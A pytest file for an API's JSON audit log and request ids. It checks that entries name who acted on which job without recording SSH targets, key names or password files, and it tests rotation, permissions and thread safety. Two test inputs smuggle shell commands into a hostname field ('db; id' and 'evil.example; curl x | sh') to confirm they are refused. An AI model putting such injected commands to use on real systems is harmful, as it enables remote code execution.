"""Audit log and request ids. Spec: ux-api UX-37.

One JSON line per security-relevant action. It must say who did what to which job, and it
must never hold an SSH target, a key name, a database user, a password file or query text.
"""
import json
import logging
import threading
from datetime import datetime
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from src.api import audit, common, limits
from src.api.main import app
from src.api.routes import assessments, preflight, results
from src.contracts.preflight import PreflightCheck, PreflightResult
from src.tools.aws import elasticache_pricing as pricing_api

FIXTURES = Path(__file__).parent.parent / "fixtures"
PREFIX = "/api/v1"
SSH_TARGET = "deploy-user@db-host.example.internal"
KEY_NAME = "apcat_ed25519"
DB_USER = "apcat_ro"
PASSWORD_FILE = "/home/deploy-user/.apcat-db-password"  # nosec B105 - test value, not a password
SECRETS = (SSH_TARGET, "deploy-user", KEY_NAME, DB_USER, PASSWORD_FILE)


@pytest.fixture
def collection() -> dict:
    return json.loads((FIXTURES / "strong_candidate_collection.json").read_text())


@pytest.fixture
def client(tmp_path, monkeypatch) -> TestClient:
    monkeypatch.setattr(common, "ARTIFACT_ROOT", str(tmp_path))
    monkeypatch.delenv("AUDIT_LOG_PATH", raising=False)
    return TestClient(app, client=("127.0.0.1", 50000))


@pytest.fixture
def started(monkeypatch) -> list:
    calls: list = []
    monkeypatch.setattr(assessments, "_run_from_collection", lambda *a: calls.append(a))
    monkeypatch.setattr(assessments, "_run_job", lambda *a: calls.append(a))
    return calls


def log_path(tmp_path) -> Path:
    return tmp_path / "audit.log"


def entries(tmp_path) -> list[dict]:
    path = log_path(tmp_path)
    if not path.exists():
        return []
    return [json.loads(line) for line in path.read_text().splitlines()]


def events(tmp_path, name) -> list[dict]:
    return [e for e in entries(tmp_path) if e["event"] == name]


def live(job_id="live-1", **over) -> dict:
    body = {"job_id": job_id, "cluster_endpoint": "db.example.internal", "port": 5433,
            "database_name": "appdb", "mode": "live",
            "live_config": {"ssh_target": SSH_TARGET, "identity_file": KEY_NAME,
                            "db_user": DB_USER, "password_file": PASSWORD_FILE},
            "collection_options": {"window_minutes": 15}}
    body.update(over)
    return body


def finished(client, collection, **body) -> str:
    r = client.post(f"{PREFIX}/assessments/from-collection",
                    json={"collector_output": collection, "price": False, **body})
    assert r.json()["status"] == "complete"
    return r.json()["job_id"]


# ---------------------------------------------------------------------------
# What is written
# ---------------------------------------------------------------------------


def test_a_live_submit_says_who_what_and_where(client, started, tmp_path):
    r = client.post(f"{PREFIX}/assessments", params={"label": "Orders", "region": "eu-west-1"},
                    json=live())
    assert r.status_code == 200
    (e,) = events(tmp_path, "job_submitted")
    assert e["job_id"] == "live-1" and e["source"] == "live" and e["label"] == "Orders"
    assert e["actor"] == "anonymous" and e["peer"] == "127.0.0.1"
    assert e["request_id"] == r.headers["x-request-id"]
    assert datetime.fromisoformat(e["ts"]).tzinfo is not None
    assert e["input"] == {"cluster_endpoint": "db.example.internal", "port": 5433,
                          "database_name": "appdb", "mode": "live", "schemas": None,
                          "window_minutes": 15, "start_at": None}
    assert e["options"] == {"use_llm": False, "size": True, "price": True, "region": "eu-west-1",
                            "model_id": None, "require_llm": False}


def test_no_ssh_target_key_user_or_password_file_is_ever_written(client, started, tmp_path,
                                                                  monkeypatch):
    client.post(f"{PREFIX}/assessments", json=live())
    monkeypatch.setattr(preflight, "run_preflight", lambda req: PreflightResult(
        ok=True, checks=[], duration_seconds=0.1))
    client.post(f"{PREFIX}/assessments/preflight", json=live("p"))
    client.post(f"{PREFIX}/assessments", json=live("bad", cluster_endpoint="db; id"))
    text = log_path(tmp_path).read_text()
    assert text.count("\n") == 3
    for secret in SECRETS:
        assert secret not in text


def test_a_refused_target_is_logged_by_field_name_never_by_value(client, started, tmp_path):
    r = client.post(f"{PREFIX}/assessments", json=live(
        cluster_endpoint="evil.example; curl x | sh", database_name="a b"))
    assert r.status_code == 422
    (e,) = events(tmp_path, "submit_refused")
    assert e["route"] == "submit" and e["reason"] == "invalid_target"
    assert e["fields"] == ["cluster_endpoint", "database_name"]
    assert "evil" not in log_path(tmp_path).read_text()
    assert started == []  # and no job was made
    assert events(tmp_path, "job_submitted") == []


def test_a_collection_submit_logs_options_and_never_the_collection(client, collection, tmp_path):
    job = finished(client, collection, label="From file")
    (e,) = events(tmp_path, "job_submitted")
    assert e["job_id"] == job and e["source"] == "collection" and e["label"] == "From file"
    assert e["options"]["price"] is False and e["rerun_of"] is None
    text = log_path(tmp_path).read_text()
    queries = [q["query_text"] for q in collection["queries"]["query_patterns"] if q.get("query_text")]
    assert queries and not any(q[:40] in text for q in queries)


def test_a_rerun_names_the_job_it_came_from(client, collection, tmp_path):
    job = finished(client, collection)
    new = client.post(f"{PREFIX}/assessments/{job}/rerun", json={}).json()["job_id"]
    (e,) = events(tmp_path, "job_rerun")
    assert e["job_id"] == new and e["rerun_of"] == job and e["source"] == "collection"


def test_cancel_and_delete(client, started, collection, tmp_path):
    queued = client.post(f"{PREFIX}/assessments/from-collection",
                         json={"collector_output": collection}).json()["job_id"]
    client.post(f"{PREFIX}/assessments/{queued}/cancel")
    client.delete(f"{PREFIX}/assessments/{queued}")
    (c,) = events(tmp_path, "job_cancel")
    (d,) = events(tmp_path, "job_deleted")
    assert c["job_id"] == d["job_id"] == queued and c["result"] == "cancelled"


def test_an_action_that_changed_nothing_is_not_logged(client, started, collection, tmp_path):
    client.post(f"{PREFIX}/assessments/nope-1/cancel")
    client.delete(f"{PREFIX}/assessments/nope-1")
    queued = client.post(f"{PREFIX}/assessments/from-collection",
                         json={"collector_output": collection}).json()["job_id"]
    client.delete(f"{PREFIX}/assessments/{queued}")  # busy: 409
    done = finished(client, collection)
    client.post(f"{PREFIX}/assessments/{done}/cancel")  # finished: 409
    assert events(tmp_path, "job_cancel") == [] and events(tmp_path, "job_deleted") == []


def test_a_preflight_logs_the_target_and_what_failed(client, tmp_path, monkeypatch):
    monkeypatch.setattr(preflight, "run_preflight", lambda req: PreflightResult(
        ok=False, duration_seconds=0.2,
        checks=[PreflightCheck(name="ssh", status="pass", message="ok"),
                PreflightCheck(name="database", status="fail", message="no")]))
    client.post(f"{PREFIX}/assessments/preflight", json=live("p"))
    (e,) = events(tmp_path, "preflight")
    assert (e["endpoint"], e["port"], e["database"]) == (
        "db.example.internal", 5433, "appdb")
    assert "aws_region" not in e
    assert e["ok"] is False and e["failed"] == ["database"]


def test_a_refused_preflight_is_logged_too(client, tmp_path):
    client.post(f"{PREFIX}/assessments/preflight", json=live("p", database_name="a b"))
    (e,) = events(tmp_path, "submit_refused")
    assert e["route"] == "preflight" and e["fields"] == ["database_name"]


def test_only_a_priced_what_if_is_logged(client, collection, tmp_path, monkeypatch):
    monkeypatch.setattr(pricing_api, "get_elasticache_instance_types",
                        lambda *a, **k: {"error": "offline"})
    job = finished(client, collection)
    assert client.post(f"{PREFIX}/assessments/{job}/sizing", json={"price": False}).status_code == 200
    assert events(tmp_path, "what_if_priced") == []
    assert client.post(f"{PREFIX}/assessments/{job}/sizing",
                       json={"price": True, "region": "eu-west-1"}).status_code == 200
    (e,) = events(tmp_path, "what_if_priced")
    assert e["job_id"] == job and e["aws_region"] == "eu-west-1"


# ---------------------------------------------------------------------------
# The log itself
# ---------------------------------------------------------------------------


def test_a_quote_or_unicode_in_a_value_cannot_forge_an_entry(client, started, collection, tmp_path):
    for label in ('say "hi"', "back\\slash", "line\u2028sep", "caf\u00e9 \u2713", '{"event":"x"}'):
        client.post(f"{PREFIX}/assessments/from-collection",
                    json={"collector_output": collection, "label": label})
    rows = entries(tmp_path)  # every line parses on its own
    assert len(rows) == 5 and {r["event"] for r in rows} == {"job_submitted"}
    assert [r["label"] for r in rows][-1] == '{"event":"x"}'


def test_long_values_are_cut_and_sensitive_names_are_dropped(tmp_path, monkeypatch):
    monkeypatch.setattr(common, "ARTIFACT_ROOT", str(tmp_path))
    monkeypatch.delenv("AUDIT_LOG_PATH", raising=False)
    audit.record("probe", note="x" * 1000, ssh_target=SSH_TARGET,
                 nested={"password_file": PASSWORD_FILE, "kept": "yes"}, query_text="select 1")
    (e,) = entries(tmp_path)
    assert e["note"] == "x" * audit.MAX_VALUE_LENGTH + "..."
    assert e["nested"] == {"kept": "yes"}
    assert "ssh_target" not in e and "query_text" not in e
    assert PASSWORD_FILE not in log_path(tmp_path).read_text()


def test_an_entry_outside_a_request_has_no_caller_details(tmp_path, monkeypatch):
    monkeypatch.setattr(common, "ARTIFACT_ROOT", str(tmp_path))
    monkeypatch.delenv("AUDIT_LOG_PATH", raising=False)
    audit.record("retention_sweep", deleted=0)
    (e,) = entries(tmp_path)
    assert e["actor"] == "anonymous" and e["peer"] is None and e["request_id"] is None


def test_the_path_can_be_set(client, started, collection, tmp_path, monkeypatch):
    elsewhere = tmp_path / "logs" / "apcat-audit.jsonl"
    monkeypatch.setenv("AUDIT_LOG_PATH", str(elsewhere))
    finished(client, collection)
    assert elsewhere.is_file() and not log_path(tmp_path).exists()


def test_the_file_is_private_to_its_owner(client, collection, tmp_path):
    finished(client, collection)
    assert log_path(tmp_path).stat().st_mode & 0o777 == 0o600


def test_the_log_is_rotated_and_old_files_are_dropped(tmp_path, monkeypatch):
    monkeypatch.setattr(common, "ARTIFACT_ROOT", str(tmp_path))
    monkeypatch.delenv("AUDIT_LOG_PATH", raising=False)
    monkeypatch.setattr(audit, "MAX_BYTES", 600)
    monkeypatch.setattr(audit, "BACKUPS", 2)
    for n in range(40):
        audit.record("probe", n=n)
    names = sorted(p.name for p in tmp_path.iterdir())
    assert names == ["audit.log", "audit.log.1", "audit.log.2"]
    seen = []
    for name in ("audit.log.2", "audit.log.1", "audit.log"):
        lines = (tmp_path / name).read_text().splitlines()
        assert lines and all(json.loads(line)["event"] == "probe" for line in lines)
        assert (tmp_path / name).stat().st_size <= 600
        seen += [json.loads(line)["n"] for line in lines]
    assert seen == sorted(seen) and seen[-1] == 39  # oldest dropped, newest kept, in order


def test_many_threads_write_whole_lines(tmp_path, monkeypatch):
    monkeypatch.setattr(common, "ARTIFACT_ROOT", str(tmp_path))
    monkeypatch.delenv("AUDIT_LOG_PATH", raising=False)

    def work(t):
        for n in range(50):
            audit.record("probe", t=t, n=n)

    threads = [threading.Thread(target=work, args=(t,)) for t in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=20)
    assert len(entries(tmp_path)) == 400


def test_an_unwritable_log_does_not_fail_the_request(client, collection, tmp_path, monkeypatch, caplog):
    blocker = tmp_path / "blocker"
    blocker.write_text("a file, not a folder")
    monkeypatch.setenv("AUDIT_LOG_PATH", str(blocker / "audit.log"))
    with caplog.at_level(logging.ERROR):
        job = finished(client, collection)
    assert job
    assert any("Could not write the audit log" in r.getMessage() for r in caplog.records)


def test_there_is_no_route_to_read_the_log():
    assert not [p for p in app.openapi()["paths"] if "audit" in p]


# ---------------------------------------------------------------------------
# Request ids
# ---------------------------------------------------------------------------


def test_every_response_has_its_own_request_id(client, collection):
    ids = set()
    for path in ("/health", f"{PREFIX}/capabilities", f"{PREFIX}/assessments/nope/status",
                 f"{PREFIX}/assessments?limit=0", "/no/such/route"):
        r = client.get(path)
        assert len(r.headers["x-request-id"]) == 32
        ids.add(r.headers["x-request-id"])
    assert len(ids) == 5


def test_the_id_is_on_the_refusals_too(tmp_path, monkeypatch):
    monkeypatch.setattr(common, "ARTIFACT_ROOT", str(tmp_path))
    remote = TestClient(app, client=("203.0.113.7", 50000))
    assert remote.get("/health").headers["x-request-id"]

    local = TestClient(app, client=("127.0.0.1", 50000))
    monkeypatch.setattr(limits, "MAX_REQUEST_BYTES", 500)
    assert local.post(f"{PREFIX}/assessments/preflight",
                      json={"pad": "x" * 2000}).headers["x-request-id"]

    held = [preflight._slots.acquire(blocking=False) for _ in range(common.MAX_CONCURRENT_PREFLIGHTS)]
    monkeypatch.setattr(limits, "MAX_REQUEST_BYTES", 64 * 1024 * 1024)
    try:
        r = local.post(f"{PREFIX}/assessments/preflight", json=live("p"))
        assert r.status_code == 429 and r.headers["x-request-id"]
    finally:
        for ok in held:
            if ok:
                preflight._slots.release()


def test_an_unexpected_error_carries_the_id_so_it_can_be_found_in_the_log(tmp_path, monkeypatch, caplog):
    monkeypatch.setattr(common, "ARTIFACT_ROOT", str(tmp_path))
    monkeypatch.setattr(results, "orchestrator",
                        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))
    quiet = TestClient(app, client=("127.0.0.1", 50000), raise_server_exceptions=False)
    with caplog.at_level(logging.ERROR):
        r = quiet.get(f"{PREFIX}/assessments/x/analysis")
    assert r.status_code == 500
    rid = r.headers["x-request-id"]
    assert rid and rid in caplog.text


def test_the_browser_may_read_the_request_id(client):
    r = client.get("/health", headers={"Origin": "http://localhost:3000"})
    exposed = r.headers["access-control-expose-headers"]
    assert "X-Request-ID" in exposed and "Retry-After" in exposed


def test_the_caller_is_not_leaked_between_requests(client, started, collection, tmp_path):
    a = client.post(f"{PREFIX}/assessments/from-collection", json={"collector_output": collection})
    b = client.post(f"{PREFIX}/assessments/from-collection", json={"collector_output": collection})
    first, second = events(tmp_path, "job_submitted")
    assert first["request_id"] == a.headers["x-request-id"]
    assert second["request_id"] == b.headers["x-request-id"] != first["request_id"]
